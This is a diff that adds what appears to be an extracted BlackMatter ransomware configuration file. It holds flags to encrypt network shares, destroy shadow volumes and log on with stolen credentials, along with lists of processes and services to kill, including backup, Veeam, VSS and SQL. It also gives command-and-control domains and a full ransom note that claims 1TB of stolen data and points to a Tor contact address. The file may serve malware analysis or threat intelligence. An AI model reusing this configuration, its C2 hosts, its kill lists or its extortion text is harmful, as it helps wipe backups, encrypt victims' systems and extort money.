@@ -1,0 +1,107 @@
+{
+	"VICTIM_ID":	"0x51, 0x24, 0x78, 0xC0, 0x8D, 0xAD, 0xA2, 0xAF, 0x19, 0xE4, 0x98, 0x08, 0xFB, 0xDA, 0x5B, 0x0B, 0xA6, 0xF3, 0x30, 0xB0, 0x9C, 0xD4, 0x7B, 0x4F, 0xB9, 0x21, 0x4F, 0x78, 0x36, 0xAA, 0x46, 0xAD",
+	"NEED_MAKE_LOGON":	"true",
+	"CRYPT_UNITS":	"true",
+	"DESTROY_SHADOW_VOLUMES":	"true",
+	"KILL_PROCESSES":	"true",
+	"KILL_SERVICES":	"true",
+	"CREATE_MUTEX":	"true",
+	"PREPARE_VICTIM_DATA":	"true",
+	"PROCESS_TO_KILL":	[{
+			"":	"encsvc"
+		}, {
+			"":	"thebat"
+		}, {
+			"":	"mydesktopqos"
+		}, {
+			"":	"xfssvccon"
+		}, {
+			"":	"firefox"
+		}, {
+			"":	"infopath"
+		}, {
+			"":	"winword"
+		}, {
+			"":	"steam"
+		}, {
+			"":	"synctime"
+		}, {
+			"":	"notepad"
+		}, {
+			"":	"ocomm"
+		}, {
+			"":	"onenote"
+		}, {
+			"":	"mspub"
+		}, {
+			"":	"thunderbird"
+		}, {
+			"":	"agntsvc"
+		}, {
+			"":	"sql"
+		}, {
+			"":	"excel"
+		}, {
+			"":	"powerpnt"
+		}, {
+			"":	"outlook"
+		}, {
+			"":	"wordpad"
+		}, {
+			"":	"dbeng50"
+		}, {
+			"":	"isqlplussvc"
+		}, {
+			"":	"sqbcoreservice"
+		}, {
+			"":	"oracle"
+		}, {
+			"":	"ocautoupds"
+		}, {
+			"":	"dbsnmp"
+		}, {
+			"":	"msaccess"
+		}, {
+			"":	"tbirdconfig"
+		}, {
+			"":	"ocssd"
+		}, {
+			"":	"mydesktopservice"
+		}, {
+			"":	"visio"
+		}],
+	"SERVICES_TO_KILL":	[{
+			"":	"mepocs"
+		}, {
+			"":	"memtas"
+		}, {
+			"":	"veeam"
+		}, {
+			"":	"svc$"
+		}, {
+			"":	"backup"
+		}, {
+			"":	"sql"
+		}, {
+			"":	"vss"
+		}],
+	"C2_URLS":	[{
+			"":	"https://paymenthacks.com"
+		}, {
+			"":	"http://paymenthacks.com"
+		}, {
+			"":	"https://mojobiden.com"
+		}, {
+			"":	"http://mojobiden.com"
+		}],
+	"LOGON_USERS_INFORMATION":	[{
+			"":	"XXXXXXXXXXX:XXXXXXX"
+		}, {
+			"":	"XXXXXXXXXXX:XXXXXXX"
+		}, {
+			"":	"XXXXXXXXXXX:XXXXXXX"
+		}],
+	"RANSOM_NOTE":	[{
+			"":	"      ~+                                       \r\n               *       +\r\n         '     BLACK        |\r\n     ()    .-.,='``'=.    - o -         \r\n           '=/_       \\     |           \r\n        *   |  '=._    |                \r\n             \\     `=./`,        '    \r\n          .   '=.__.=' `='      *\r\n +             Matter        +\r\n      O      *        '       .\r\n\r\n>>> What happens?\r\n   Your network is encrypted, and currently not operational. We have downloaded 1TB from your fileserver.\r\n   We need only money, after payment we will give you a decryptor for the entire network and you will restore all the data.\r\n\r\n>>> What guarantees? \r\n   We are not a politically motivated group and we do not need anything other than your money. \r\n   If you pay, we will provide you the programs for decryption and we will delete your data. \r\n   If we do not give you decrypters or we do not delete your data, no one will pay us in the future, this does not comply with our goals. \r\n   We always keep our promises.\r\n\r\n>> Data leak includes\r\n1. Full emloyeers personal data\r\n2. Network information\r\n3. Schemes of buildings, active project information, architect details and contracts, \r\n4. Finance info\r\n\r\n\r\n>>> How to contact with us? \r\n   1. Download and install TOR Browser (https://www.torproject.org/).\r\n   2. Open http://supp24yy6a66hwszu2piygicgwzdtbwftb76htfj7vnip3getgqnzxid.onion/7NT6LXKC1XQHW5039BLOV.\r\n  \r\n>>> Warning! Recovery recommendations.  \r\n   We strongly recommend you to do not MODIFY or REPAIR your files, that will damage them."
+		}]
+}
